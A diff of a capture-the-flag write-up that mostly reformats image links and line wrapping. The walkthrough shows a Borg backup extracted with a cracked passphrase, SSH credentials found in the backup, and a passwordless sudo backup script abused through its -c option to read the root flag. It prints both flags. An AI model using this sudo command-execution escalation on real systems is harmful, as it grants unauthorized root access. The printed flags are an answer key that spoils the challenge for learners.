@@ -166,19 +166,13 @@ squidward
 
 ## 5. Download the Borg backup archive
 
-Return to the admin page and open the **Archive** section. Use the
-download option shown in the screenshot to download the backup archive.
+Return to the admin page and open the **Archive** section. Use the download option shown in the screenshot to download the backup archive.
 
-**Screenshot --- Archive download option**
+<img width="226" height="143" alt="click_on_download" src="https://github.com/user-attachments/assets/3168b638-fb53-4c2e-9d27-2e934bfc56f7" />
 
-![Archive download option](images/click_on_download.png)
+The downloaded file is named `final_archive`. The screenshot shows the archive's contents and identifies it as a Borg Backup repository.
 
-The downloaded file is named `final_archive`. The screenshot shows the
-archive's contents and identifies it as a Borg Backup repository.
-
-**Screenshot --- Downloaded archive contents**
-
-![Borg archive files](images/inside-of-download-zip.png)
+<img width="488" height="298" alt="inside-of-download-zip" src="https://github.com/user-attachments/assets/93cf26ba-0406-493e-8373-b71d9ef43f9c" />
 
 ## 6. Inspect and extract the Borg archive
 
@@ -190,8 +184,7 @@ cd archive
 borg list ../final_archive
 ```
 
-When prompted for the repository passphrase, use the recovered password
-from the previous step:
+When prompted for the repository passphrase, use the recovered password from the previous step:
 
 ``` text
 squidward
@@ -199,9 +192,7 @@ squidward
 
 The archive listing shows a backup named `music_archive`.
 
-**Screenshot --- Borg archive listing**
-
-![Borg list](images/7.png)
+<img width="1121" height="195" alt="7" src="https://github.com/user-attachments/assets/6a11c3f9-9937-4ef1-a2c4-a82cb0a4279a" />
 
 Extract the backup:
 
@@ -211,9 +202,7 @@ borg extract ../final_archive ::music_archive
 
 Enter the same passphrase when prompted.
 
-**Screenshot --- Borg extraction**
-
-![Borg extract](images/8.png)
+<img width="533" height="132" alt="8" src="https://github.com/user-attachments/assets/6a78115b-aa94-4457-b6ae-df8222f46b28" />
 
 Inspect the extracted directory structure:
 
@@ -224,9 +213,7 @@ ls
 
 The backup contains Alex's home directory and several personal files.
 
-**Screenshot --- Extracted home directory**
-
-![Extracted Alex home](images/9.png)
+<img width="799" height="357" alt="9" src="https://github.com/user-attachments/assets/22e9912d-4e1e-47cb-94c3-2cde0c499187" />
 
 ## 7. Discover Alex's credentials in the backup
 
@@ -237,16 +224,11 @@ cat Desktop/secret.txt
 cat Documents/note.txt
 ```
 
-The note explains that Alex writes passwords down because he has trouble
-remembering them. It contains the SSH credentials:
+The note explains that Alex writes passwords down because he has trouble remembering them. It contains the SSH credentials:
 
 ``` text
 alex:S3cretP@s3
 ```
-
-**Screenshot --- Recovered credentials**
-
-![Credentials in backup](images/9.png)
 
 ## 8. SSH as Alex and retrieve the user flag
 
@@ -264,9 +246,7 @@ S3cretP@s3
 
 The screenshot confirms a successful SSH login as `alex`.
 
-**Screenshot --- SSH login**
-
-![SSH as Alex](images/10.png)
+<img width="715" height="496" alt="10" src="https://github.com/user-attachments/assets/4d5fe7f8-764a-4e85-8025-51f2194d28a9" />
 
 List the home directory and read the user flag:
 
@@ -281,9 +261,7 @@ The user flag shown in the screenshot is:
 flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
 ```
 
-**Screenshot --- User flag**
-
-![User flag](images/11.png)
+<img width="690" height="76" alt="11" src="https://github.com/user-attachments/assets/3d13132a-9aca-4ef1-b021-0ebc6c9fb78f" />
 
 ## 9. Check sudo permissions
 
@@ -293,16 +271,13 @@ Check which commands Alex can execute with elevated privileges:
 sudo -l
 ```
 
-The output shows that Alex can run the backup script as any user without
-entering a password:
+The output shows that Alex can run the backup script as any user without entering a password:
 
 ``` text
 (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
 ```
 
-**Screenshot --- Sudo permissions**
-
-![Sudo permissions](images/12.png)
+<img width="975" height="138" alt="12" src="https://github.com/user-attachments/assets/dc6742f5-d51d-4f64-a032-e780b05a0bee" />
 
 Inspect the script:
 
@@ -310,14 +285,9 @@ Inspect the script:
 cat /etc/mp3backups/backup.sh
 ```
 
-The script processes a `-c` option using `getopts` and stores its
-argument in a variable named `command`. The script later executes that
-variable. Since the script is allowed to run through `sudo`, this option
-creates a command-execution path with elevated privileges.
+The script processes a `-c` option using `getopts` and stores its argument in a variable named `command`. The script later executes that variable. Since the script is allowed to run through `sudo`, this option creates a command-execution path with elevated privileges.
 
-**Screenshot --- Backup script source**
-
-![Backup script](images/13.png)
+<img width="893" height="611" alt="13" src="https://github.com/user-attachments/assets/bccd2f3f-28c5-4976-9027-c2a894b3a610" />
 
 The backup directory and its file list can also be inspected:
 
@@ -328,14 +298,11 @@ cat /etc/mp3backups/backup_files.txt
 
 The screenshot shows the backup file list and the backup archive output.
 
-**Screenshot --- Backup directory and file list**
-
-![Backup files](images/14.png)
+<img width="525" height="314" alt="14" src="https://github.com/user-attachments/assets/bbfc16f2-7f17-48b9-8290-3ef17c6c9f78" />
 
 ## 10. Confirm the command execution path
 
-Run the script through the permitted sudo rule and pass a harmless
-command to its `-c` option:
+Run the script through the permitted sudo rule and pass a harmless command to its `-c` option:
 
 ``` bash
 sudo /etc/mp3backups/backup.sh -c whoami
@@ -343,33 +310,26 @@ sudo /etc/mp3backups/backup.sh -c whoami
 
 The screenshot records this test and shows the script's backup output.
 
-**Screenshot --- Testing the `-c` option**
-
-![Command execution test](images/16.png)
+<img width="677" height="580" alt="16" src="https://github.com/user-attachments/assets/6cf319ba-d620-497f-8cde-ac343c3faf82" />
 
 ## 11. Read the root flag
 
-Because the script executes the supplied command with root privileges,
-pass a command that reads the root flag:
+Because the script executes the supplied command with root privileges, pass a command that reads the root flag:
 
 ``` bash
 sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt'
 ```
 
-The screenshot shows the command and its output at the end of the backup
-script execution:
+The screenshot shows the command and its output at the end of the backup script execution:
 
 ``` text
 flag{Than5s_f0r_play1ng_H0pe_y0u_enJ053d}
 ```
 
-**Screenshot --- Root flag**
-
-![Root flag](images/17.png)
+<img width="632" height="575" alt="17" src="https://github.com/user-attachments/assets/050cefa6-9b91-4ce7-91b5-432650b2afd8" />
 
 ## Flags
 
-  Flag   Value
-  ------ ---------------------------------------------
   User   `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
+  
   Root   `flag{Than5s_f0r_play1ng_H0pe_y0u_enJ053d}`
